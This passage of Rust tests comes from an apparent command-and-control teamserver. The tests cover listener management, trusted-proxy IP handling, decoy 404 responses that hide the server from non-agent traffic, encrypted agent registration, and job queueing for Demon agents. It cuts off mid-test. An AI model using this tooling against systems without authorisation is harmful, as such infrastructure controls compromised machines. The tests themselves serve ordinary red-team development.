            TrustedProxyPeer::Address(IpAddr::V4(Ipv4Addr::new(203, 0, 113, 20))),
        ];
        let request = Request::builder()
            .header("X-Forwarded-For", "198.51.100.24, 203.0.113.20")
            .body(Body::empty())
            .expect("request should build");

        let external_ip = extract_external_ip(true, &trusted_proxy_peers, peer, &request);
        assert_eq!(external_ip, IpAddr::V4(Ipv4Addr::new(198, 51, 100, 24)));
    }

    #[test]
    fn extract_external_ip_ignores_invalid_forwarded_for_and_falls_back_to_x_real_ip() {
        let peer = SocketAddr::from(([203, 0, 113, 10], 443));
        let trusted_proxy_peers = vec![TrustedProxyPeer::Address(peer.ip())];
        let request = Request::builder()
            .header("X-Forwarded-For", "not-an-ip, 10.0.0.77")
            .header("X-Real-IP", "192.0.2.44")
            .body(Body::empty())
            .expect("request should build");

        let external_ip = extract_external_ip(true, &trusted_proxy_peers, peer, &request);
        assert_eq!(external_ip, IpAddr::V4(Ipv4Addr::new(192, 0, 2, 44)));
    }

    #[test]
    fn extract_external_ip_trusts_forwarded_headers_from_allowed_proxy_cidr() {
        let peer = SocketAddr::from(([10, 1, 2, 3], 443));
        let trusted_proxy_peers =
            vec![parse_trusted_proxy_peer("10.0.0.0/8", "edge").expect("cidr should parse")];
        let request = Request::builder()
            .header("X-Real-IP", "192.0.2.44")
            .body(Body::empty())
            .expect("request should build");

        let external_ip = extract_external_ip(true, &trusted_proxy_peers, peer, &request);
        assert_eq!(external_ip, IpAddr::V4(Ipv4Addr::new(192, 0, 2, 44)));
    }

    #[test]
    fn parse_trusted_proxy_peer_rejects_invalid_entries() {
        let error = parse_trusted_proxy_peer("10.0.0.0/33", "edge")
            .expect_err("invalid prefix length should fail");
        assert!(matches!(error, ListenerManagerError::InvalidConfig { .. }));
    }

    #[tokio::test]
    async fn create_and_list_persist_listener_state() -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let summary = manager.create(http_listener("alpha", 32001)).await?;

        assert_eq!(summary.name, "alpha");
        assert_eq!(summary.state.status, ListenerStatus::Created);
        assert_eq!(manager.list().await?.len(), 1);

        Ok(())
    }

    #[tokio::test]
    async fn start_stop_and_delete_manage_runtime_handles() -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        manager.create(http_listener("alpha", 32002)).await?;

        let running = manager.start("alpha").await?;
        assert_eq!(running.state.status, ListenerStatus::Running);

        let stopped = manager.stop("alpha").await?;
        assert_eq!(stopped.state.status, ListenerStatus::Stopped);

        manager.delete("alpha").await?;
        assert!(matches!(
            manager.summary("alpha").await,
            Err(ListenerManagerError::ListenerNotFound { .. })
        ));

        Ok(())
    }

    #[tokio::test]
    async fn sync_profile_deletes_persisted_listener_missing_from_profile()
    -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let removed_port = available_port()
            .map_err(|error| ListenerManagerError::InvalidConfig { message: error.to_string() })?;
        let kept_port = available_port()
            .map_err(|error| ListenerManagerError::InvalidConfig { message: error.to_string() })?;
        manager.create(http_listener("removed", removed_port)).await?;
        manager.start("removed").await?;

        let profile = Profile::parse(&format!(
            r#"
            Teamserver {{
              Host = "127.0.0.1"
              Port = 40056
            }}

            Operators {{
              user "operator" {{
                Password = "password1234"
              }}
            }}

            Listeners {{
              Http = [{{
                Name = "kept"
                Hosts = ["127.0.0.1"]
                HostBind = "127.0.0.1"
                HostRotation = "round-robin"
                PortBind = {kept_port}
                Secure = false
              }}]
            }}

            Demon {{}}
            "#
        ))
        .map_err(|error| ListenerManagerError::InvalidConfig { message: error.to_string() })?;

        manager.sync_profile(&profile).await?;

        assert!(matches!(
            manager.summary("removed").await,
            Err(ListenerManagerError::ListenerNotFound { .. })
        ));
        assert!(!manager.active_handles.read().await.contains_key("removed"));
        assert_eq!(manager.summary("kept").await?.state.status, ListenerStatus::Created);

        Ok(())
    }

    #[tokio::test]
    async fn start_records_bind_errors() -> Result<(), ListenerManagerError> {
        let blocker = tokio::net::TcpListener::bind("127.0.0.1:32003")
            .await
            .map_err(|error| ListenerManagerError::InvalidConfig { message: error.to_string() })?;
        let manager = manager().await?;
        manager.create(http_listener("alpha", 32003)).await?;

        let error = manager.start("alpha").await.expect_err("bind should fail");
        let summary = manager.summary("alpha").await?;

        drop(blocker);

        assert!(matches!(error, ListenerManagerError::StartFailed { .. }));
        assert_eq!(summary.state.status, ListenerStatus::Error);
        assert!(summary.state.last_error.is_some());

        Ok(())
    }

    #[tokio::test]
    async fn create_rejects_external_listener_until_runtime_support_exists()
    -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let error = manager
            .create(external_listener("external", "svc"))
            .await
            .expect_err("external listener should be rejected");

        assert!(matches!(error, ListenerManagerError::InvalidConfig { .. }));
        assert!(error.to_string().contains("not supported yet"), "unexpected error: {error}");
        assert!(matches!(
            manager.summary("external").await,
            Err(ListenerManagerError::ListenerNotFound { .. })
        ));

        Ok(())
    }

    #[tokio::test]
    async fn create_accepts_dns_listener_config() -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let summary =
            manager.create(dns_listener_config("dns-managed", 5300, "c2.example.com")).await?;

        assert_eq!(summary.name, "dns-managed");
        assert_eq!(summary.protocol, ListenerProtocol::Dns);
        assert_eq!(summary.state.status, ListenerStatus::Created);
        assert_eq!(summary.config, dns_listener_config("dns-managed", 5300, "c2.example.com"));

        Ok(())
    }

    #[tokio::test]
    async fn update_accepts_dns_listener_config() -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let port = free_udp_port();
        manager.create(dns_listener_config("dns-update", port, "c2.example.com")).await?;
        let updated_port = free_udp_port();

        let summary = manager
            .update(dns_listener_config("dns-update", updated_port, "ops.example.com"))
            .await?;

        assert_eq!(summary.state.status, ListenerStatus::Stopped);
        assert_eq!(
            summary.config,
            dns_listener_config("dns-update", updated_port, "ops.example.com")
        );

        Ok(())
    }

    #[tokio::test]
    async fn start_persisted_dns_listener_uses_dns_runtime() -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let repository = manager.repository();
        let port = free_udp_port();
        repository.create(&dns_listener_config("dns-runtime", port, "c2.example.com")).await?;

        let summary = manager.start("dns-runtime").await?;

        assert_eq!(summary.state.status, ListenerStatus::Running);
        assert!(manager.active_handles.read().await.contains_key("dns-runtime"));

        manager.stop("dns-runtime").await?;
        let summary = manager.summary("dns-runtime").await?;

        assert_eq!(summary.state.status, ListenerStatus::Stopped);
        assert!(!manager.active_handles.read().await.contains_key("dns-runtime"));

        Ok(())
    }

    #[tokio::test]
    async fn restore_running_restarts_dns_listener() -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let repository = manager.repository();
        let port = free_udp_port();
        repository.create(&dns_listener_config("dns-restore", port, "c2.example.com")).await?;
        repository.set_state("dns-restore", ListenerStatus::Running, None).await?;

        manager.restore_running().await?;
        let summary = manager.summary("dns-restore").await?;

        assert_eq!(summary.state.status, ListenerStatus::Running);
        assert!(manager.active_handles.read().await.contains_key("dns-restore"));

        manager.stop("dns-restore").await?;

        Ok(())
    }

    #[tokio::test]
    async fn restore_running_marks_external_listener_as_error() -> Result<(), ListenerManagerError>
    {
        let manager = manager().await?;
        let repository = manager.repository();
        repository.create(&external_listener("external", "svc")).await?;
        repository.set_state("external", ListenerStatus::Running, None).await?;

        manager.restore_running().await?;
        let summary = manager.summary("external").await?;

        assert_eq!(summary.state.status, ListenerStatus::Error);
        assert!(summary.state.last_error.as_deref().is_some_and(|message| {
            message.contains("not supported yet") && message.contains("svc")
        }));
        assert!(!manager.active_handles.read().await.contains_key("external"));

        Ok(())
    }

    #[tokio::test]
    async fn runtime_exit_clears_handle_and_marks_listener_stopped()
    -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let repository = manager.repository();
        repository.create(&http_listener("alpha", 32004)).await?;
        repository.set_state("alpha", ListenerStatus::Running, None).await?;

        let handle = spawn_managed_listener_task(
            "alpha".to_owned(),
            Box::pin(async { Ok(()) }),
            repository.clone(),
            manager.active_handles.clone(),
        );
        manager.active_handles.write().await.insert("alpha".to_owned(), handle);

        wait_for_listener_status(&manager, "alpha", ListenerStatus::Stopped).await?;
        assert!(!manager.active_handles.read().await.contains_key("alpha"));

        Ok(())
    }

    #[tokio::test]
    async fn runtime_error_clears_handle_and_marks_listener_error()
    -> Result<(), ListenerManagerError> {
        let manager = manager().await?;
        let repository = manager.repository();
        repository.create(&http_listener("alpha", 32005)).await?;
        repository.set_state("alpha", ListenerStatus::Running, None).await?;

        let handle = spawn_managed_listener_task(
            "alpha".to_owned(),
            Box::pin(async { Err("boom".to_owned()) }),
            repository.clone(),
            manager.active_handles.clone(),
        );
        manager.active_handles.write().await.insert("alpha".to_owned(), handle);

        wait_for_listener_status(&manager, "alpha", ListenerStatus::Error).await?;
        let summary = manager.summary("alpha").await?;
        assert_eq!(summary.state.last_error.as_deref(), Some("boom"));
        assert!(!manager.active_handles.read().await.contains_key("alpha"));

        Ok(())
    }

    #[tokio::test]
    async fn start_prunes_finished_stale_handle_before_restart() -> Result<(), ListenerManagerError>
    {
        let manager = manager().await?;
        let port = available_port()
            .map_err(|error| ListenerManagerError::InvalidConfig { message: error.to_string() })?;
        manager.create(http_listener("alpha", port)).await?;

        let finished_handle = tokio::spawn(async {});
        for _ in 0..20 {
            if finished_handle.is_finished() {
                break;
            }
            sleep(Duration::from_millis(10)).await;
        }

        manager.active_handles.write().await.insert("alpha".to_owned(), finished_handle);
        let running = manager.start("alpha").await?;

        assert_eq!(running.state.status, ListenerStatus::Running);
        assert!(manager.active_handles.read().await.contains_key("alpha"));

        manager.stop("alpha").await?;

        Ok(())
    }

    #[tokio::test]
    async fn http_listener_returns_fake_404_for_non_matching_requests()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry, events, sockets, None);
        let port = available_port()?;
        let agent_id = 0x1234_5678;
        let config = ListenerConfig::from(HttpListenerConfig {
            name: "edge-http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["127.0.0.1".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: port,
            port_conn: Some(port),
            method: Some("POST".to_owned()),
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: Some("Agent-UA".to_owned()),
            headers: vec!["Accept-Encoding: gzip".to_owned(), "X-Auth: 123".to_owned()],
            uris: vec!["/submit".to_owned()],
            host_header: None,
            secure: false,
            cert: None,
            response: Some(HttpListenerResponseConfig {
                headers: vec![
                    "Server: ExampleFront".to_owned(),
                    "Content-Type: text/plain".to_owned(),
                ],
                body: Some("decoy".to_owned()),
            }),
            proxy: None,
        });

        manager.create(config).await?;
        manager.start("edge-http").await?;
        wait_for_listener(port, false).await?;

        let client = Client::new();

        let invalid = client.get(format!("http://127.0.0.1:{port}/nope")).send().await?;
        assert_eq!(invalid.status(), StatusCode::NOT_FOUND);
        assert_eq!(invalid.text().await?, "decoy");

        let valid = client
            .post(format!("http://127.0.0.1:{port}/submit"))
            .header("User-Agent", "Agent-UA")
            .header("X-Auth", "123")
            .body(valid_demon_request_body(agent_id))
            .send()
            .await?;
        assert_eq!(valid.status(), StatusCode::NOT_FOUND);
        assert_eq!(
            valid.headers().get("server").and_then(|value| value.to_str().ok()),
            Some("ExampleFront")
        );
        assert_eq!(valid.text().await?, "decoy");

        manager.stop("edge-http").await?;
        Ok(())
    }

    #[tokio::test]
    async fn https_listener_generates_tls_and_accepts_requests()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry, events, sockets, None);
        let port = available_port()?;
        let agent_id = 1;
        let key = [0x41; AGENT_KEY_LENGTH];
        let iv = [0x24; AGENT_IV_LENGTH];
        let config = ListenerConfig::from(HttpListenerConfig {
            name: "edge-https".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["localhost".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: port,
            port_conn: Some(port),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/".to_owned()],
            host_header: None,
            secure: true,
            cert: None,
            response: Some(HttpListenerResponseConfig {
                headers: vec!["Server: TLSFront".to_owned()],
                body: Some("tls".to_owned()),
            }),
            proxy: None,
        });

        manager.create(config).await?;
        manager.start("edge-https").await?;
        wait_for_listener(port, true).await?;

        let client = Client::builder().danger_accept_invalid_certs(true).build()?;
        let response = client
            .post(format!("https://127.0.0.1:{port}/"))
            .body(valid_demon_init_body(agent_id, key, iv))
            .send()
            .await?;
        assert_eq!(response.status(), StatusCode::OK);
        assert_eq!(
            response.headers().get("server").and_then(|value| value.to_str().ok()),
            Some("TLSFront")
        );
        let decrypted = decrypt_agent_data(&key, &iv, &response.bytes().await?)?;
        assert_eq!(decrypted.as_slice(), &agent_id.to_le_bytes());

        manager.stop("edge-https").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_returns_fake_404_for_invalid_demon_callback_body()
    -> Result<(), Box<dyn std::error::Error>> {
        let manager = manager().await?;
        let port = available_port()?;
        manager.create(http_listener("edge-http-invalid", port)).await?;
        manager.start("edge-http-invalid").await?;
        wait_for_listener(port, false).await?;

        let client = Client::new();

        let too_short =
            client.post(format!("http://127.0.0.1:{port}/")).body(vec![0_u8; 8]).send().await?;
        assert_eq!(too_short.status(), StatusCode::NOT_FOUND);

        let mut invalid_magic = valid_demon_request_body(0x0102_0304);
        invalid_magic[4..8].copy_from_slice(&0xFEED_FACE_u32.to_be_bytes());
        let invalid_magic =
            client.post(format!("http://127.0.0.1:{port}/")).body(invalid_magic).send().await?;
        assert_eq!(invalid_magic.status(), StatusCode::NOT_FOUND);

        manager.stop("edge-http-invalid").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_rejects_oversized_request_body() -> Result<(), Box<dyn std::error::Error>>
    {
        let manager = manager().await?;
        let port = available_port()?;
        manager.create(http_listener("edge-http-oversize", port)).await?;
        manager.start("edge-http-oversize").await?;
        wait_for_listener(port, false).await?;

        let oversized = vec![0xAA_u8; MAX_AGENT_REQUEST_BODY_LEN + 1];
        let response =
            Client::new().post(format!("http://127.0.0.1:{port}/")).body(oversized).send().await?;
        assert_eq!(response.status(), StatusCode::NOT_FOUND);

        manager.stop("edge-http-oversize").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_registers_demon_init_and_broadcasts_agent_event()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager =
            ListenerManager::new(database.clone(), registry.clone(), events.clone(), sockets, None);
        let mut event_receiver = events.subscribe();
        let port = available_port()?;

        manager.create(http_listener("edge-http-init", port)).await?;
        manager.start("edge-http-init").await?;
        wait_for_listener(port, false).await?;

        let key = [0x41; AGENT_KEY_LENGTH];
        let iv = [0x24; AGENT_IV_LENGTH];
        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_init_body(0x1234_5678, key, iv))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        let decrypted = decrypt_agent_data(&key, &iv, &response.bytes().await?)?;
        assert_eq!(decrypted.as_slice(), &0x1234_5678_u32.to_le_bytes());

        let stored = registry.get(0x1234_5678).await.expect("agent should be registered");
        assert_eq!(stored.hostname, "wkstn-01");
        assert_eq!(stored.external_ip, "127.0.0.1");
        assert_eq!(database.agents().get(0x1234_5678).await?, Some(stored.clone()));

        let event = event_receiver.recv().await.expect("agent registration should broadcast");
        let OperatorMessage::AgentNew(message) = event else {
            panic!("unexpected operator event");
        };
        assert_eq!(message.info.name_id, "12345678");
        assert_eq!(message.info.listener, "edge-http-init");
        assert_eq!(message.info.process_name, "explorer.exe");
        assert_eq!(message.info.sleep_delay, serde_json::json!(15));
        manager.stop("edge-http-init").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_uses_peer_ip_when_not_behind_redirector()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry.clone(), events, sockets, None);
        let port = available_port()?;

        manager.create(http_listener("edge-http-peer-ip", port)).await?;
        manager.start("edge-http-peer-ip").await?;
        wait_for_listener(port, false).await?;

        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .header("X-Forwarded-For", "198.51.100.24")
            .header("X-Real-IP", "198.51.100.25")
            .body(valid_demon_init_body(
                0x1111_2222,
                [0x41; AGENT_KEY_LENGTH],
                [0x24; AGENT_IV_LENGTH],
            ))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        let stored = registry.get(0x1111_2222).await.expect("agent should be registered");
        assert_eq!(stored.external_ip, "127.0.0.1");

        manager.stop("edge-http-peer-ip").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_trusts_forwarded_ip_from_trusted_redirector()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry.clone(), events, sockets, None);
        let port = available_port()?;

        manager
            .create(http_listener_with_redirector(
                "edge-http-redirector",
                port,
                vec!["127.0.0.1/32".to_owned()],
            ))
            .await?;
        manager.start("edge-http-redirector").await?;
        wait_for_listener(port, false).await?;

        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .header("X-Forwarded-For", "203.0.113.200, 198.51.100.24")
            .body(valid_demon_init_body(
                0x3333_4444,
                [0x41; AGENT_KEY_LENGTH],
                [0x24; AGENT_IV_LENGTH],
            ))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        let stored = registry.get(0x3333_4444).await.expect("agent should be registered");
        assert_eq!(stored.external_ip, "198.51.100.24");

        manager.stop("edge-http-redirector").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_rate_limits_demon_init_per_source_ip()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry.clone(), events, sockets, None);
        let port = available_port()?;

        manager.create(http_listener("edge-http-init-limit", port)).await?;
        manager.start("edge-http-init-limit").await?;
        wait_for_listener(port, false).await?;

        let client = Client::new();
        for attempt in 0..MAX_DEMON_INIT_ATTEMPTS_PER_IP {
            let agent_id = 0x1000_0000 + attempt;
            let response = client
                .post(format!("http://127.0.0.1:{port}/"))
                .body(valid_demon_init_body(
                    agent_id,
                    [0x41; AGENT_KEY_LENGTH],
                    [0x24; AGENT_IV_LENGTH],
                ))
                .send()
                .await?;
            assert_eq!(response.status(), StatusCode::OK);
            assert!(registry.get(agent_id).await.is_some());
        }

        let blocked_agent_id = 0x1000_00FF;
        let blocked = client
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_init_body(
                blocked_agent_id,
                [0x41; AGENT_KEY_LENGTH],
                [0x24; AGENT_IV_LENGTH],
            ))
            .send()
            .await?;
        assert_eq!(blocked.status(), StatusCode::NOT_FOUND);
        assert!(registry.get(blocked_agent_id).await.is_none());

        manager.stop("edge-http-init-limit").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_returns_empty_body_when_agent_has_no_jobs()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry.clone(), events, sockets, None);
        let port = available_port()?;
        let key = [0x51; AGENT_KEY_LENGTH];
        let iv = [0x19; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        manager.create(http_listener("edge-http-empty-jobs", port)).await?;
        manager.start("edge-http-empty-jobs").await?;
        wait_for_listener(port, false).await?;

        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_callback_body(
                agent_id,
                key,
                iv,
                u32::from(DemonCommand::CommandGetJob),
                7,
                &[],
            ))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        assert!(response.bytes().await?.is_empty());

        manager.stop("edge-http-empty-jobs").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_preserves_headers_but_not_decoy_body_for_empty_successful_callbacks()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry.clone(), events, sockets, None);
        let port = available_port()?;
        let key = [0x31; AGENT_KEY_LENGTH];
        let iv = [0x17; AGENT_IV_LENGTH];
        let agent_id = 0x0BAD_F00D;
        let config = ListenerConfig::from(HttpListenerConfig {
            name: "edge-http-decoy-success".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["127.0.0.1".to_owned()],
            host_bind: "127.0.0.1".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: port,
            port_conn: Some(port),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/".to_owned()],
            host_header: None,
            secure: false,
            cert: None,
            response: Some(HttpListenerResponseConfig {
                headers: vec!["Server: ExampleFront".to_owned()],
                body: Some("decoy".to_owned()),
            }),
            proxy: None,
        });

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        manager.create(config).await?;
        manager.start("edge-http-decoy-success").await?;
        wait_for_listener(port, false).await?;

        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_callback_body(
                agent_id,
                key,
                iv,
                u32::from(DemonCommand::CommandGetJob),
                7,
                &[],
            ))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        assert_eq!(
            response.headers().get("server").and_then(|value| value.to_str().ok()),
            Some("ExampleFront")
        );
        assert!(response.bytes().await?.is_empty());

        manager.stop("edge-http-decoy-success").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_reconnect_ack_does_not_advance_ctr_offset()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry.clone(), events, sockets, None);
        let port = available_port()?;
        let key = [0x52; AGENT_KEY_LENGTH];
        let iv = [0x1A; AGENT_IV_LENGTH];
        let agent_id = 0x1020_3040;
        let client = Client::new();

        manager.create(http_listener("edge-http-reconnect", port)).await?;
        manager.start("edge-http-reconnect").await?;
        wait_for_listener(port, false).await?;

        let init_response = client
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_init_body(agent_id, key, iv))
            .send()
            .await?;
        assert_eq!(init_response.status(), StatusCode::OK);
        let _ = init_response.bytes().await?;

        let reconnect_response = client
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_request_body(agent_id))
            .send()
            .await?;

        assert_eq!(reconnect_response.status(), StatusCode::OK);
        let reconnect_bytes = reconnect_response.bytes().await?;
        let decrypted = decrypt_agent_data_at_offset(&key, &iv, 1, &reconnect_bytes)?;

        assert_eq!(decrypted.as_slice(), &agent_id.to_le_bytes());
        assert_eq!(registry.ctr_offset(agent_id).await?, 1);

        manager.stop("edge-http-reconnect").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_unknown_reconnect_probe_returns_fake_404_and_audit_entry()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database.clone(), registry, events, sockets, None);
        let port = available_port()?;
        let client = Client::new();
        let agent_id = 0xDEAD_BEEF;

        manager.create(http_listener("edge-http-unknown-reconnect", port)).await?;
        manager.start("edge-http-unknown-reconnect").await?;
        wait_for_listener(port, false).await?;

        let reconnect_response = client
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_request_body(agent_id))
            .send()
            .await?;

        assert_eq!(reconnect_response.status(), StatusCode::NOT_FOUND);

        let audit_page = query_audit_log(
            &database,
            &AuditQuery {
                action: Some("agent.reconnect_probe".to_owned()),
                ..AuditQuery::default()
            },
        )
        .await?;

        assert_eq!(audit_page.total, 1);
        let entry = &audit_page.items[0];
        assert_eq!(entry.actor, "teamserver");
        assert_eq!(entry.action, "agent.reconnect_probe");
        assert_eq!(entry.target_kind, "agent");
        assert_eq!(entry.target_id.as_deref(), Some("DEADBEEF"));
        assert_eq!(entry.agent_id.as_deref(), Some("DEADBEEF"));
        assert_eq!(entry.command.as_deref(), Some("reconnect_probe"));
        assert_eq!(entry.result_status, AuditResultStatus::Failure);
        assert_eq!(
            entry
                .parameters
                .as_ref()
                .and_then(|value| value.get("listener"))
                .and_then(serde_json::Value::as_str),
            Some("edge-http-unknown-reconnect")
        );
        assert_eq!(
            entry
                .parameters
                .as_ref()
                .and_then(|value| value.get("external_ip"))
                .and_then(serde_json::Value::as_str),
            Some("127.0.0.1")
        );

        manager.stop("edge-http-unknown-reconnect").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_serializes_all_queued_jobs_for_get_job()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager = ListenerManager::new(database, registry.clone(), events, sockets, None);
        let port = available_port()?;
        let key = [0x61; AGENT_KEY_LENGTH];
        let iv = [0x27; AGENT_IV_LENGTH];
        let agent_id = 0x5566_7788;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandSleep),
                    request_id: 41,
                    payload: vec![1, 2, 3, 4],
                    command_line: "sleep 10".to_owned(),
                    task_id: "task-41".to_owned(),
                    created_at: "2026-03-09T20:10:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;
        registry
            .enqueue_job(
                agent_id,
                Job {
                    command: u32::from(DemonCommand::CommandCheckin),
                    request_id: 42,
                    payload: vec![5, 6, 7],
                    command_line: "checkin".to_owned(),
                    task_id: "task-42".to_owned(),
                    created_at: "2026-03-09T20:11:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;
        manager.create(http_listener("edge-http-jobs", port)).await?;
        manager.start("edge-http-jobs").await?;
        wait_for_listener(port, false).await?;

        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_callback_body(
                agent_id,
                key,
                iv,
                u32::from(DemonCommand::CommandGetJob),
                9,
                &[],
            ))
            .send()
            .await?;

        assert_eq!(response.status(), StatusCode::OK);
        let bytes = response.bytes().await?;
        let message = DemonMessage::from_bytes(bytes.as_ref())?;
        let response_ctr_offset = ctr_blocks_for_len(4);
        assert_eq!(message.packages.len(), 2);
        assert_eq!(message.packages[0].command_id, u32::from(DemonCommand::CommandSleep));
        assert_eq!(message.packages[0].request_id, 41);
        let pt0 = decrypt_agent_data_at_offset(
            &key,
            &iv,
            response_ctr_offset,
            &message.packages[0].payload,
        )?;
        assert_eq!(pt0, vec![1, 2, 3, 4]);
        assert_eq!(message.packages[1].command_id, u32::from(DemonCommand::CommandCheckin));
        assert_eq!(message.packages[1].request_id, 42);
        let pt1 = decrypt_agent_data_at_offset(
            &key,
            &iv,
            response_ctr_offset + ctr_blocks_for_len(message.packages[0].payload.len()),
            &message.packages[1].payload,
        )?;
        assert_eq!(pt1, vec![5, 6, 7]);
        assert!(registry.queued_jobs(agent_id).await?.is_empty());

        manager.stop("edge-http-jobs").await?;
        Ok(())
    }

    #[tokio::test]
    async fn http_listener_checkin_refreshes_metadata_and_accepts_rotated_transport()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let manager =
            ListenerManager::new(database.clone(), registry.clone(), events.clone(), sockets, None);
        let mut event_receiver = events.subscribe();
        let port = available_port()?;
        let key = [0x71; AGENT_KEY_LENGTH];
        let iv = [0x37; AGENT_IV_LENGTH];
        let refreshed_key = [0x12; AGENT_KEY_LENGTH];
        let refreshed_iv = [0x34; AGENT_IV_LENGTH];
        let agent_id = 0xCAFE_BABE;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;

        manager.create(http_listener("edge-http-checkin", port)).await?;
        manager.start("edge-http-checkin").await?;
        wait_for_listener(port, false).await?;

        let response = Client::new()
            .post(format!("http://127.0.0.1:{port}/"))
            .body(valid_demon_multi_callback_body(
                agent_id,
                key,
                iv,
                (u32::from(DemonCommand::CommandGetJob), 5, Vec::new()),
                &[(
                    u32::from(DemonCommand::CommandCheckin),
                    6,
                    sample_checkin_metadata_payload(agent_id, refreshed_key, refreshed_iv),
                )],
